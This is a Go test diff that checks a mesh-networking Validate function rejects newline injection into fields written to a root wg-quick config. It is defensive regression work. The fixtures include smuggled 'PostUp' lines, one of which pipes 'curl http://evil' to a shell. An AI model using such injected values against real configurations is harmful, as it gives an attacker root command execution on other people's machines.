@@ -2,6 +2,7 @@ package mesh
 
 import (
 	"context"
+	"encoding/base64"
 	"errors"
 	"io"
 	"io/fs"
@@ -11,6 +12,42 @@ import (
 	"strings"
 	"testing"
 )
+
+func strptr(s string) *string { return &s }
+
+// TestValidateRejectsInjection pins SIGMA-360: the unsigned mesh-peers channel
+// feeds a root wg-quick config, so a newline in any CP-supplied value would inject
+// a config line (an interface-level PostUp runs as root). Validate must reject
+// every such value before anything is written or applied.
+func TestValidateRejectsInjection(t *testing.T) {
+	goodKey := base64.StdEncoding.EncodeToString(make([]byte, 32))
+
+	// The RCE payload in the self mesh IP, which lands in [Interface].
+	if err := Validate("10.8.0.1\nPostUp = curl http://evil | sh", nil); err == nil {
+		t.Fatal("a newline-bearing self mesh IP must be rejected")
+	}
+
+	// A clean set validates.
+	ep := "203.0.113.7:51820"
+	if err := Validate("10.8.0.1", []Peer{
+		{ServerID: "srv_b", Name: "host-b", Pubkey: goodKey, MeshIP: "10.8.0.2"},
+		{ServerID: "srv_c", Name: "host-c", Pubkey: goodKey, MeshIP: "10.8.0.3", Endpoint: &ep},
+	}); err != nil {
+		t.Fatalf("a clean peer set must validate: %v", err)
+	}
+
+	// Each per-peer field is independently guarded.
+	for name, peer := range map[string]Peer{
+		"mesh ip":  {ServerID: "s", Pubkey: goodKey, MeshIP: "10.8.0.9\n[Interface]\nPostUp = id"},
+		"pubkey":   {ServerID: "s", Pubkey: "not\nbase64", MeshIP: "10.8.0.9"},
+		"endpoint": {ServerID: "s", Pubkey: goodKey, MeshIP: "10.8.0.9", Endpoint: strptr("1.2.3.4:22\nPostUp = id")},
+		"name":     {ServerID: "s", Name: "a\nPostUp = id", Pubkey: goodKey, MeshIP: "10.8.0.9"},
+	} {
+		if err := Validate("10.8.0.1", []Peer{peer}); err == nil {
+			t.Fatalf("an injection in the %s field must be rejected", name)
+		}
+	}
+}
 
 func TestLoadOrCreateKeyRoundTrip(t *testing.T) {
 	dir := t.TempDir()
